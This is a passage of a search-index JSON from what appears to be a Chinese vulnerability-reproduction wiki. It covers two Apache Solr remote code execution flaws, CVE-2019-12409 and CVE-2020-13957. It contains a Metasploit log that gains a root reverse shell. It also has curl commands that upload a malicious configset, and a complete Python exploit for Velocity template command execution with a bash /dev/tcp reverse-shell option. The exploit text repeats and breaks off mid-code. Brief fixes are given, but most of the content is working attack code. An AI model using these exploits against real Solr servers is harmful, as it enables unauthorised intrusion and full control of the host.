CVE-2019-12409"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/#apache-solr-jmx\u670d\u52a1-rce--cve-2019-12409","text":"","title":"Apache Solr JMX\u670d\u52a1 RCE  CVE-2019-12409"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Java ManagementExtensions\uff08JMX\uff09\u662f\u4e00\u79cdJava\u6280\u672f\uff0c\u4e3a\u7ba1\u7406\u548c\u76d1\u89c6\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u5bf9\u8c61\u3001\u8bbe\u5907\uff08\u5982\u6253\u5370\u673a\uff09\u548c\u9762\u5411\u670d\u52a1\u7684\u7f51\u7edc\u63d0\u4f9b\u76f8\u5e94\u7684\u5de5\u5177\u3002JMX \u4f5c\u4e3a Java\u7684\u4e00\u79cdBean\u7ba1\u7406\u673a\u5236\uff0c\u5982\u679cJMX\u670d\u52a1\u7aef\u53e3\u66b4\u9732\uff0c\u90a3\u4e48\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u8ba9\u8be5\u670d\u52a1\u5668\u8fdc\u7a0b\u52a0\u8f7d\u6076\u610f\u7684Bean\u6587\u4ef6\uff0c\u968f\u7740Bean\u7684\u6ee5\u7528\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/#\u73af\u5883\u642d\u5efa","text":"\u4e0b\u8f7d Apache Solr 8.2.0 \u4e5f\u53ef\u4ee5docker\u642d\u5efa docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/#\u6f0f\u6d1e\u590d\u73b0","text":"\u67e5\u770b\u642d\u5efa\u7684Solr\u662f\u5426\u5b58\u5728\u6f0f\u6d1e,\u67e5\u770bsolr.in.sh\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ENABLE_REMOTE_JMX_OPTS\u9009\u9879\u8bbe\u7f6e\u662f\u5426\u4e3a\u201cTure\u201d\uff0c\u5982\u679c\u4e3aTure\uff0c\u5219\u5b58\u5728\u6f0f\u6d1e \u67e5\u770b\u6f0f\u6d1e\u7aef\u53e318983\u662f\u5426\u5f00\u653e [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/\u684c\u9762# msfconsole , , / \\ (( __---,,,---__ )) ( _ ) O O ( _ ) _________ \\ _ / | \\ o_o \\ M S F | \\ \\ _____ | * || | WW || | || | || | =[ metasploit v5.0.101-dev ] + -- -- =[ 2049 exploits - 1108 auxiliary - 344 post ] + -- -- =[ 562 payloads - 45 encoders - 10 nops ] + -- -- =[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [ * ] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit ( multi/misc/java_jmx_server ) > set rhost 192 .168.51.146 rhost = > 192 .168.51.146 msf5 exploit ( multi/misc/java_jmx_server ) > set rport 18983 rport = > 18983 msf5 exploit ( multi/misc/java_jmx_server ) > set payload java/meterpreter/reverse_tcp payload = > java/meterpreter/reverse_tcp msf5 exploit ( multi/misc/java_jmx_server ) > options Module options ( exploit/multi/misc/java_jmx_server ) : Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192 .168.51.146 yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 18983 yes The target port ( TCP ) SRVHOST 0 .0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0 .0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate ( default is randomly generated ) URIPATH no The URI to use for this exploit ( default is random ) Payload options ( java/meterpreter/reverse_tcp ) : Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192 .168.51.149 yes The listen address ( an interface may be specified ) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic ( Java Payload ) msf5 exploit ( multi/misc/java_jmx_server ) > run [ * ] Started reverse TCP handler on 192 .168.51.149:4444 [ * ] 192 .168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [ * ] 192 .168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [ * ] 192 .168.51.146:18983 - Sending RMI Header... [ * ] 192 .168.51.146:18983 - Discovering the JMXRMI endpoint... [ + ] 192 .168.51.146:18983 - JMXRMI endpoint on 127 .0.1.1:18983 [ * ] 192 .168.51.146:18983 - Proceeding with handshake... [ + ] 192 .168.51.146:18983 - Handshake with JMX MBean server on 127 .0.1.1:18983 [ * ] 192 .168.51.146:18983 - Loading payload... [ * ] 192 .168.51.146:18983 - Replied to request for mlet [ * ] 192 .168.51.146:18983 - Replied to request for payload JAR [ * ] 192 .168.51.146:18983 - Executing payload... [ * ] 192 .168.51.146:18983 - Replied to request for payload JAR [ * ] Sending stage ( 53944 bytes ) to 192 .168.51.146 [ * ] Meterpreter session 1 opened ( 192 .168.51.149:4444 -> 192 .168.51.146:56234 ) at 2020 -11-05 14 :17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id \u7528\u6237id = 0 ( root ) \u7ec4id = 0 ( root ) \u7ec4 = 0 ( root )","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20JMX%E6%9C%8D%E5%8A%A1%20RCE%20CVE-2019-12409/#\u6f0f\u6d1e\u4fee\u590d","text":"\u5c06solr.in.sh\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ENABLE_REMOTE_JMX_OPTS\u9009\u9879\u8bbe\u7f6e\u4e3afalse\uff0c\u7136\u540e\u91cd\u542fSolr\u670d\u52a1\u3002","title":"\u6f0f\u6d1e\u4fee\u590d"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/","text":"Apache Solr RCE \u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e CVE-2020-13957 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5728\u7279\u5b9a\u7684Solr\u7248\u672c\u4e2dConfigSet API\u5b58\u5728\u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 \u73af\u5883\u642d\u5efa \u00b6 \u9009\u62e9\u4e00\u4e2a\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c \u4e0b\u8f7d\u5404\u7248\u672cSolr\u5730\u5740 \u8fd9\u91cc\u590d\u73b0\u4f7f\u7528\u7684\u662f Apache Solr 7.7.0 \u8fdb\u884c\u590d\u73b0 \u4e0b\u8f7d\u540e\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u73af\u5883\u90e8\u7f72 cd solr-7.7.0 ./bin/solr start -e cloud -force \u7136\u540e\u4e00\u8def\u56de\u8f66\uff0c\u76f4\u81f3\u51fa\u73b0 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728\u653b\u51fb\u673a\u4e0a\u4e0b\u8f7d\u76ee\u6807\u7248\u672c\u7684Solr,\u6267\u884c\u4e0b\u5217\u547d\u4ee4\u6253\u5305\u538b\u7f29\u6587\u4ef6 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip \u5c06 vuln.zip \u8fdb\u884c\u4e0a\u4f20 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] name\u53c2\u6570\u4e3a\u538b\u7f29\u5305\u7684\u6587\u4ef6\u540d \u5229\u7528\u6f0f\u6d1e\u521b\u5efa\u4e00\u4e2a core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] name\u53c2\u6570\u4e3a\u521b\u5efa\u7684core\u6838\u5fc3\u540d collection.configName\u53c2\u6570\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u67e5\u770bcore\u5217\u8868\uff0c\u53d1\u73b0\u5df2\u7ecf\u6210\u529f\u521b\u5efa \u518d\u4f7f\u7528 Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558 \u5373\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4 POC\u4f7f\u7528\u8be6\u60c5\u53c2\u8003\u53e6\u4e00\u7bc7\u590d\u73b0\u6587\u7ae0 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u4f7f\u7528\u524d\u6309\u590d\u73b0\u6b65\u9aa4\u4e0a\u4f20\u5bf9\u5e94\u7248\u672c\u7684zip\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u8fd9\u91cc\u4e0a\u4f20\u7684\u6587\u4ef6\u4e3a qwert.zip,\u5176\u4ed6\u4f7f\u7528\u65b9\u6cd5\u4e0e Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558 \u7684POC\u4f7f\u7528\u65b9\u6cd5\u7c7b\u4f3c #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr 6.6.0 -6.6.5 \\033 [0m' ) print ( '+ \\033 [34m Apache Solr 7.0.0 -7.7.3 \\033 [0m' ) print ( '+ \\033 [34m Apache Solr 8.0.0 -8.6.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2020-13957.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mZip >>> vuln.zip(Zip\u6587\u4ef6\u540d) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , file_name ): core_name = str ( input ( \" \\033 [35mPlease input Create Core Name \\n Core >>> \\033 [0m\" )) core_update = \"\"\" %s /solr/admin/collections?action=CREATE&name= %s &numShards=1&replicationFactor=1&wt=xml&collection.configName= %s \"\"\" % ( target_url , core_name , file_name . replace ( \".zip\" , \"\" )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } response = requests . get ( url = core_update , headers = headers , timeout = 30 ) if response . status_code != 200 : print ( \" \\033 [31m[x] \u521b\u5efaCore\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) else : core = re . findall ( r '<str name=\"core\">(.*?)</str>' , response . text )[ 0 ] vuln_url = target_url + \"/solr/\" + core + \"/config\" print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core + \"/config \\033 [0m\" ) return vuln_url , core def POC_2 ( target_url , core ): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests . request ( \"POST\" , url = open_params , data = set_api_data , headers = headers , timeout = 10 ) if response . status_code == 200 : print ( \" \\033 [32m[o] POST\u8bf7\u6c42\u6210\u529f\u5c06params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue \\033 [0m\" ) else : print ( \" \\033 [31m[x] POST\u8bf7\u6c42params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , core , cmd ): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vuln_url , headers = headers , timeout = 10 ) if \"Error 500\" in response . text : print ( \" \\033 [31m[x] \u4ee3\u7801\u6267\u884c\u5931\u8d25\uff0c\u54cd\u5e94\u4e3a Error 500 \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , response . text ) def POC_4 ( target_url , core , IP , PORT ): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \" %2F bin %2F bash%20-c %20% 24 %40% 7Cbash %200% 20echo%20bash%20-i %20% 3E %26% 2Fdev %2F tcp %2F{}%2F{}%200% 3E%261\" . format ( IP , PORT ) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vnul_url , headers = headers ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_name = str ( input ( \" \\033 [35mPlease input File Name \\n Zip >>> \\033 [0m\" )) vuln_url , core = POC_1 ( target_url , file_name ) POC_2 ( target_url , core ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) elif cmd == \"shell\" : IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_4 ( target_url , core , IP , PORT ) else : POC_3 ( target_url , core , cmd )","title":"Apache Solr RCE \u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e CVE-2020-13957"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/#apache-solr-rce-\u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e-cve-2020-13957","text":"","title":"Apache Solr RCE \u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e CVE-2020-13957"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5728\u7279\u5b9a\u7684Solr\u7248\u672c\u4e2dConfigSet API\u5b58\u5728\u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/#\u73af\u5883\u642d\u5efa","text":"\u9009\u62e9\u4e00\u4e2a\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c \u4e0b\u8f7d\u5404\u7248\u672cSolr\u5730\u5740 \u8fd9\u91cc\u590d\u73b0\u4f7f\u7528\u7684\u662f Apache Solr 7.7.0 \u8fdb\u884c\u590d\u73b0 \u4e0b\u8f7d\u540e\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u73af\u5883\u90e8\u7f72 cd solr-7.7.0 ./bin/solr start -e cloud -force \u7136\u540e\u4e00\u8def\u56de\u8f66\uff0c\u76f4\u81f3\u51fa\u73b0 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5728\u653b\u51fb\u673a\u4e0a\u4e0b\u8f7d\u76ee\u6807\u7248\u672c\u7684Solr,\u6267\u884c\u4e0b\u5217\u547d\u4ee4\u6253\u5305\u538b\u7f29\u6587\u4ef6 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip \u5c06 vuln.zip \u8fdb\u884c\u4e0a\u4f20 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] name\u53c2\u6570\u4e3a\u538b\u7f29\u5305\u7684\u6587\u4ef6\u540d \u5229\u7528\u6f0f\u6d1e\u521b\u5efa\u4e00\u4e2a core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] name\u53c2\u6570\u4e3a\u521b\u5efa\u7684core\u6838\u5fc3\u540d collection.configName\u53c2\u6570\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u67e5\u770bcore\u5217\u8868\uff0c\u53d1\u73b0\u5df2\u7ecf\u6210\u529f\u521b\u5efa \u518d\u4f7f\u7528 Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558 \u5373\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4 POC\u4f7f\u7528\u8be6\u60c5\u53c2\u8003\u53e6\u4e00\u7bc7\u590d\u73b0\u6587\u7ae0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2020-13957/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u4f7f\u7528\u524d\u6309\u590d\u73b0\u6b65\u9aa4\u4e0a\u4f20\u5bf9\u5e94\u7248\u672c\u7684zip\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u8fd9\u91cc\u4e0a\u4f20\u7684\u6587\u4ef6\u4e3a qwert.zip,\u5176\u4ed6\u4f7f\u7528\u65b9\u6cd5\u4e0e Apache Solr Velocity\u6a21\u677f\u8fdc\u7a0b\u6267\u884c CVE-2019-17558 \u7684POC\u4f7f\u7528\u65b9\u6cd5\u7c7b\u4f3c #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr 6.6.0 -6.6.5 \\033 [0m' ) print ( '+ \\033 [34m Apache Solr 7.0.0 -7.7.3 \\033 [0m' ) print ( '+ \\033 [34m Apache Solr 8.0.0 -8.6.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2020-13957.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mZip >>> vuln.zip(Zip\u6587\u4ef6\u540d) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , file_name ): core_name = str ( input ( \" \\033 [35mPlease input Create Core Name \\n Core >>> \\033 [0m\" )) core_update = \"\"\" %s /solr/admin/collections?action=CREATE&name= %s &numShards=1&replicationFactor=1&wt=xml&collection.configName= %s \"\"\" % ( target_url , core_name , file_name . replace ( \".zip\" , \"\" )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } response = requests . get ( url = core_update , headers = headers , timeout = 30 ) if response . status_code != 200 : print ( \" \\033 [31m[x] \u521b\u5efaCore\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) else : core = re . findall ( r '<str name=\"core\">(.*?)</str>' , response . text )[ 0 ] vuln_url = target_url + \"/solr/\" + core + \"/config\" print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core + \"/config \\033 [0m\" ) return vuln_url , core def POC_2 ( target_url , core ): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests . request ( \"POST\" , url = open_params , data = set_api_data , headers = headers , timeout = 10 ) if response . status_code == 200 : print ( \" \\033 [32m[o] POST\u8bf7\u6c42\u6210\u529f\u5c06params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue \\033 [0m\" ) else : print ( \" \\033 [31m[x] POST\u8bf7\u6c42params.resource.loader.enabled\u8bbe\u7f6e\u4e3aTrue\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , core , cmd ): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vuln_url , headers = headers , timeout = 10 ) if \"Error 500\" in response . text : print ( \" \\033 [31m[x] \u4ee3\u7801\u6267\u884c\u5931\u8d25\uff0c\u54cd\u5e94\u4e3a Error 500 \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , response . text ) def POC_4 ( target_url , core , IP , PORT ): # POC : /bin/bash -c $@|bash 0 echo bash -i 